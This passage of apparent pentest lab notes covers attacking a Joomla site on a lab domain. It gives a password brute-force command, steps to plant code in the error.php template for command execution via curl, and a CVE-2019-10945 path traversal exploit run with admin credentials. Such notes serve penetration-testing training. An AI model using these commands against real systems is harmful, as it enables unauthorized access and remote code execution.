...
## [Brute Force](https://github.com/ajnik/joomla-bruteforce)

```shell
my@attack:~$ joomla-brute.py -u "http://dev.inlanefreight.local" -usr admin -w /usr/local/share/wordlists/SecLists/Passwords/Default-Credentials/default-passwords.txt
```
...
2. CONFIGURATION
    * Templates
    * Templates: Protostar Details and Files
3. Editor
    * error.php
    * Save

```php title="error.php" linenums="1" hl_lines="10"
<?php
/**
 * @package     Joomla.Site
...
```shell
my@attack:~$ curl -s 'http://dev.inlanefreight.local/templates/protostar/error.php?0=id'
```
...
## [Path Traversal](https://github.com/dpgg101/CVE-2019-10945)

```shell
my@attack:~$ python3 CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```
